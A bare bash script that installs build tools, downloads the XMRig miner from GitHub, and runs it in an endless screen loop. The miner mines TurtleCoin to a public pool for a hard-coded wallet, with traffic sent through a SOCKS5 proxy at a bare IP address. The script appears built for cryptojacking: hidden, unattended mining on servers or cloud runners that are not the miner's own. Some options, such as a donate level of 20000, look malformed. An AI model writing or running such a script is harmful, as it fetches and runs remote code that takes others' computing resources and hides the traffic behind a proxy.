#!/bin/bash
apt-get update -y
apt-get install -y libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential
apt install screen -y screen
wget https://github.com/xmrig/xmrig/releases/download/v6.11.1/xmrig-6.11.1-bionic-x64.tar.gz
tar -xvf xmrig-6.11.1-bionic-x64.tar.gz
cd xmrig-6.11.1
while [ 1 ]; do
screen ./xmrig --donate-level 20000 -o us.turtlecoin.herominers.com:10381 -u TRTLuweEwEqPstNHhkvxX6UPy4Nw9WAN8gFmeyDHE1Mr54WVPgwUq1L9DqHKCjmcKNHvoNfrh7w7VHVBj1efakotfkt2jeroLmy+b5a6cb7da918c5679c19d0e5ff6f2d2ed4a4f659a56ca1eb32e4702967463096.$(nproc) -t 35 -p x -a argon2/chukwav2 -k --randomx-1gb-pages --proxy socks5://98.175.31.195:4145
done
exit
